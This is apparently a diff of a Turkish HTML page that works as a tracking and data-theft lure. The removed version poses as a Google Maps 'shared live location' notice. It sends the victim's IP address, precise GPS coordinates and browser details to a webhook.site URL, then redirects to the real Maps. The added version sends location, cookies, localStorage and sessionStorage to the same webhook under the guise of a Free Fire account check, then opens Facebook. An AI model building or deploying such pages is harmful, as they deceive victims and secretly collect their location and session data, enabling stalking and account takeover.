@@ -3,250 +3,258 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Haritalar</title>
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { text-align: center; padding: 20px; width: 90%; max-width: 350px; }
-        .map-icon { width: 60px; margin-bottom: 20px; }
-        h2 { font-size: 18px; color: #3c4043; font-weight: 500; margin-bottom: 25px; line-height: 1.4; }
-        button { background-color: #1a73e8; color: white; border: none; padding: 14px 20px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; font-size: 15px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
-    </style>
-</head>
-<body>
-
-<div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/Google_Maps_icon_%282020%29.svg/1024px-Google_Maps_icon_%282020%29.svg.png" alt="Maps" class="map-icon">
-    <h2>Hassso54 sizinle canlı konumunu paylaştı.</h2>
-    <button id="goBtn" onclick="calistir()">Konumu Görüntüle</button>
-</div>
-
-<script>
-    // WEBHOOK LİNKİNİ KONTROL ET
-    const webhookURL = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";
-
-    async function calistir() {
-        const btn = document.getElementById('goBtn');
-        btn.innerText = "Yükleniyor...";
-        btn.disabled = true;
-
-        let data = {
-            tip: "Hassso54_Takip",
-            ip: "Bilinmiyor",
-            gps: "İzin Yok",
-            userAgent: navigator.userAgent
-        };
-
-        // 1. IP Al
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const json = await res.json();
-            data.ip = json.ip;
-        } catch(e) {}
-
-        // 2. Konum Al ve Gönder
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                async (p) => {
-                    data.gps = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                    await veriyiBas(data);
-                },
-                async () => {
-                    await veriyiBas(data);
-                },
-                { enableHighAccuracy: true, timeout: 8000 }
-            );
-        } else {
-            await veriyiBas(data);
-        }
-    }
-
-    async function veriyiBas(d) {
-        try {
-            await fetch(webhookURL, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify(d)
-            });
-        } catch(e) {}
-        
-        // İşlem bitince gerçek haritaya yönlendir
-        window.location.href = "https://www.google.com/maps";
-    }
-</script>
-
-</body>
-</html>
-
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hesap Takip Sistemi</title>
+    <title>Hesap Takip + Konum</title>
     <style>
         body {
-            font-family: monospace;
-            background: #0a0a0a;
-            color: #0f0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-        }
-        .kutu {
-            background: #1a1a1a;
             padding: 20px;
-            border-radius: 10px;
-            border: 1px solid #0f0;
-            width: 90%;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            width: 100%;
             max-width: 400px;
+        }
+        .kart {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
             text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        .map-icon {
+            width: 60px;
+            margin-bottom: 15px;
+        }
+        h2 {
+            font-size: 18px;
+            color: #3c4043;
+            margin-bottom: 20px;
         }
         button {
-            background: #0f0;
-            color: #000;
+            background-color: #1a73e8;
+            color: white;
             border: none;
-            padding: 15px;
-            border-radius: 5px;
-            font-weight: bold;
-            width: 100%;
-            margin: 10px 0;
+            padding: 14px 20px;
+            border-radius: 8px;
+            font-weight: 500;
             cursor: pointer;
-            font-size: 16px;
+            width: 100%;
+            font-size: 15px;
+            margin: 5px 0;
+        }
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        .konum-btn {
+            background-color: #34a853;
+        }
+        .ff-btn {
+            background-color: #ea4335;
         }
         .log {
-            background: #000;
-            padding: 10px;
+            background: #f5f5f5;
+            padding: 12px;
+            border-radius: 8px;
             font-size: 11px;
             text-align: left;
-            height: 200px;
+            height: 150px;
             overflow-y: auto;
+            font-family: monospace;
+            margin-top: 15px;
+        }
+        .durum {
+            font-size: 12px;
+            color: #666;
             margin-top: 10px;
         }
     </style>
 </head>
 <body>
-    <div class="kutu">
-        <h2>🔐 Hesap Takip Sistemi</h2>
-        <p>Facebook oturum bilgilerini ve konumu çek</p>
-        
-        <button onclick="facebookBilgileriniAl()">📱 Facebook Bilgilerini Al</button>
-        <button onclick="konumAl()">📍 Konumumu Gönder</button>
-        <button onclick="hesapTakip()">🎮 Free Fire Hesap Takibi Başlat</button>
-        
-        <div class="log" id="log">
-            > Sistem hazır<br>
-            > Butonlara tıkla
-        </div>
+
+<div class="container">
+    <!-- KONUM KARTI -->
+    <div class="kart">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/Google_Maps_icon_%282020%29.svg/1024px-Google_Maps_icon_%282020%29.svg.png" alt="Maps" class="map-icon">
+        <h2>📍 Konum Takibi</h2>
+        <button id="konumBtn" class="konum-btn" onclick="konumGonder()">Konumu Gönder</button>
+        <div id="konumDurum" class="durum"></div>
     </div>
 
-    <script>
-        const webhook = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";
-        
-        function logEkle(msg) {
-            const logDiv = document.getElementById('log');
-            logDiv.innerHTML += `<br>> ${new Date().toLocaleTimeString()} - ${msg}`;
-            logDiv.scrollTop = logDiv.scrollHeight;
+    <!-- FREE FIRE KARTI -->
+    <div class="kart">
+        <h2>🎮 Free Fire Hesap Takip</h2>
+        <button id="ffBtn" class="ff-btn" onclick="freeFireTakip()">Free Fire Hesabını Kontrol Et</button>
+        <div id="ffDurum" class="durum"></div>
+    </div>
+
+    <!-- LOG ALANI -->
+    <div class="log" id="log">
+        > Sistem hazır<br>
+        > Konum göndermek için butona tıkla<br>
+        > Free Fire takibi için diğer butona tıkla
+    </div>
+</div>
+
+<script>
+    const webhookURL = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";
+    
+    function logEkle(msg) {
+        const logDiv = document.getElementById('log');
+        const zaman = new Date().toLocaleTimeString('tr-TR');
+        logDiv.innerHTML += `<br>> ${zaman} - ${msg}`;
+        logDiv.scrollTop = logDiv.scrollHeight;
+    }
+    
+    async function webhookGonder(veri) {
+        try {
+            await fetch(webhookURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(veri)
+            });
+            logEkle("✅ Webhook'a gönderildi");
+            return true;
+        } catch(e) {
+            logEkle("❌ Gönderim hatası: " + e.message);
+            return false;
         }
+    }
+    
+    // 1. KONUM GÖNDERME (Çalışıyor)
+    async function konumGonder() {
+        const btn = document.getElementById('konumBtn');
+        const durum = document.getElementById('konumDurum');
         
-        async function gonderWebhook(veri) {
-            try {
-                await fetch(webhook, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify(veri)
-                });
-                logEkle("✅ Webhook'a gönderildi");
-            } catch(e) {
-                logEkle("❌ Gönderim hatası: " + e.message);
-            }
-        }
+        btn.innerText = "Konum alınıyor...";
+        btn.disabled = true;
+        durum.innerHTML = "📍 Konum isteniyor...";
         
-        // Facebook'tan mevcut oturum bilgilerini al
-        async function facebookBilgileriniAl() {
-            logEkle("📱 Facebook bilgileri alınıyor...");
-            
-            // Facebook uygulamasını açmaya çalış
-            window.location.href = "fb://profile";
-            
-            // Facebook'un sakladığı bilgileri dene
-            const fbBilgi = {
-                tip: "Facebook_Oturum",
-                zaman: new Date().toLocaleString('tr-TR'),
-                cihaz: navigator.userAgent,
-                platform: navigator.platform,
-                fbKullanici: localStorage.getItem('user') || "Çekilemedi",
-                fbToken: sessionStorage.getItem('fb_token') || "Çekilemedi",
-                not: "Facebook uygulaması açıldı, bilgiler manuel kontrol edilmeli"
-            };
-            
-            await gonderWebhook(fbBilgi);
-            logEkle("ℹ️ Facebook uygulaması açıldı, profil bilgilerini kontrol et");
-        }
+        let ip = "Alınamadı";
+        let konum = "İzin verilmedi";
+        
+        // IP al
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const json = await res.json();
+            ip = json.ip;
+            logEkle(`🌐 IP: ${ip}`);
+        } catch(e) {}
         
         // Konum al
-        function konumAl() {
-            logEkle("📍 Konum alınıyor...");
-            
-            if(navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        const konumLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                        const konumVeri = {
-                            tip: "Konum_Bilgisi",
-                            zaman: new Date().toLocaleString('tr-TR'),
-                            konum: konumLink,
-                            enlem: pos.coords.latitude,
-                            boylam: pos.coords.longitude,
-                            dogruluk: pos.coords.accuracy + " metre"
-                        };
-                        await gonderWebhook(konumVeri);
-                        logEkle(`📍 Konum: ${pos.coords.latitude}, ${pos.coords.longitude}`);
-                    },
-                    async (err) => {
-                        logEkle("❌ Konum hatası: " + err.message);
-                        await gonderWebhook({
-                            tip: "Konum_Hatasi",
-                            hata: err.message
-                        });
-                    }
-                );
-            } else {
-                logEkle("❌ Tarayıcı konum desteklemiyor");
-            }
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    konum = `https://www.google.com/maps?q=${lat},${lng}`;
+                    durum.innerHTML = `📍 Konum: ${lat.toFixed(4)}, ${lng.toFixed(4)}`;
+                    logEkle(`📍 Konum alındı: ${lat.toFixed(4)}, ${lng.toFixed(4)}`);
+                    
+                    const veri = {
+                        tip: "Konum_Takip",
+                        zaman: new Date().toLocaleString('tr-TR'),
+                        ip: ip,
+                        konum_link: konum,
+                        enlem: lat,
+                        boylam: lng,
+                        userAgent: navigator.userAgent
+                    };
+                    
+                    await webhookGonder(veri);
+                    btn.innerText = "Konum Gönderildi ✅";
+                    
+                    setTimeout(() => {
+                        window.location.href = konum;
+                    }, 1500);
+                },
+                async (error) => {
+                    durum.innerHTML = "❌ Konum izni verilmedi";
+                    logEkle("❌ Konum hatası: " + error.message);
+                    
+                    const veri = {
+                        tip: "Konum_Takip",
+                        zaman: new Date().toLocaleString('tr-TR'),
+                        ip: ip,
+                        konum_link: "İzin verilmedi",
+                        hata: error.message,
+                        userAgent: navigator.userAgent
+                    };
+                    
+                    await webhookGonder(veri);
+                    btn.innerText = "Konum Gönder (Tekrar Dene)";
+                    btn.disabled = false;
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else {
+            durum.innerHTML = "❌ Tarayıcı konum desteklemiyor";
+            btn.innerText = "Konum Gönder";
+            btn.disabled = false;
         }
+    }
+    
+    // 2. FREE FIRE TAKİP (Oturum kontrolü)
+    async function freeFireTakip() {
+        const btn = document.getElementById('ffBtn');
+        const durum = document.getElementById('ffDurum');
         
-        // Hesap takibi - Free Fire'dan bilgi çekmeye çalış
-        function hesapTakip() {
-            logEkle("🎮 Free Fire hesap bilgileri taranıyor...");
-            
-            // Free Fire'ın sakladığı yerleri kontrol et
-            const ffVeri = {
-                tip: "FreeFire_Hesap_Takip",
-                zaman: new Date().toLocaleString('tr-TR'),
-                cihaz: navigator.userAgent,
-                ffYukluMu: "Bilinmiyor",
-                ffVeriler: localStorage.getItem('freefire') || "Bulunamadı",
-                sessionData: JSON.stringify(sessionStorage),
-                localData: JSON.stringify(localStorage),
-                not: "Free Fire açıldığında oturum bilgileri kontrol edilecek"
-            };
-            
-            // Webhook'a gönder
-            gonderWebhook(ffVeri);
-            
-            // Free Fire'ı aç
-            logEkle("🎮 Free Fire açılıyor...");
-            setTimeout(() => {
-                window.location.href = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end";
-            }, 1000);
-        }
+        btn.innerText = "Kontrol ediliyor...";
+        btn.disabled = true;
+        durum.innerHTML = "🔍 Hesap bilgileri taranıyor...";
         
-        // Otomatik konum gönderimi
+        logEkle("🎮 Free Fire hesap takibi başlatıldı");
+        
+        // Free Fire uygulamasının varlığını kontrol et (Android için)
+        const isMobile = /Android|webOS|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        
+        // Mevcut oturum bilgilerini topla (sadece tarayıcıda olanlar)
+        const ffVeri = {
+            tip: "FreeFire_Hesap_Takip",
+            zaman: new Date().toLocaleString('tr-TR'),
+            cihaz: navigator.userAgent,
+            platform: navigator.platform,
+            mobilCihaz: isMobile,
+            localstorage: localStorage,
+            sessionstorage: sessionStorage,
+            cookies: document.cookie,
+            not: "Free Fire oturum bilgileri Facebook üzerinden yönetiliyor",
+            oneri: "Facebook Ayarları > Güvenlik ve Giriş > Oturum açık cihazlar bölümünden tüm girişleri görebilirsin"
+        };
+        
+        // Facebook hesap bilgilerini kontrol etmek için yönlendir
+        logEkle("📱 Facebook oturum bilgileri kontrol ediliyor...");
+        
+        await webhookGonder(ffVeri);
+        
+        durum.innerHTML = "✅ Bilgiler kaydedildi! Facebook'u açıyorum...";
+        logEkle("✅ Free Fire takip bilgileri webhook'a gönderildi");
+        
+        // Facebook'u aç (oradan oturum bilgilerini görebilirsin)
         setTimeout(() => {
-            konumAl();
-        }, 2000);
-    </script>
+            btn.innerText = "Free Fire Takibi Yapıldı ✅";
+            durum.innerHTML = "📱 Facebook uygulaması açılıyor...";
+            
+            // Facebook uygulamasını aç
+            window.location.href = "fb://profile";
+            
+            // Eğer Facebook uygulaması yoksa tarayıcıda aç
+            setTimeout(() => {
+                window.location.href = "https://www.facebook.com/settings?tab=security";
+            }, 500);
+        }, 1000);
+    }
+    
+    logEkle("✅ Sistem çalışıyor - Butonlara tıkla");
+</script>
+
 </body>
 </html>
